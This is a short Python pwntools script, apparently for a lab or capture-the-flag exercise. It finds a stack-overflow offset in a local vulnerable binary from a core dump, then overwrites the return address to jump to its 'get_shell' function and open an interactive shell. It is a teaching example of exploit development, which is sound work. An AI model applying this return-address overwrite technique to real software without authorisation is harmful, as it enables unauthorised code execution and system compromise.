#! /usr/bin/env python

# https://docs.pwntools.com/en/stable/elf/corefile.html

from pwn import *

target_name = './vuln_c.exe'
# Set up pwntools for the correct architecture
exe = context.binary = ELF(target_name)

print(exe.symbols)

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(128, n=4)

# Run the process once so that it crashes
p = process([target_name, payload])
p.wait()  # wait for close

# Get the core dump
core = Coredump('./core')

# Our cyclic pattern should have been used as the crashing address, make sure!
# assert p32(core.eip) in payload

offset = cyclic_find(core.eip, n=4)
# offset = cyclic_find(core.read(core.esp, 4), n=4) - 4
print('offset= ', offset)
# Cool! Now let's just replace that value with the address of 'win'
func_address = exe.symbols.get_shell
print(hex(func_address))

payload = fit({
    offset: func_address
}, filler='A')

print(payload)
# Get a shell!
io = process([target_name, payload])
# io.sendline(b'id')
# print(io.recvline())

# get interactive shell
io.interactive()
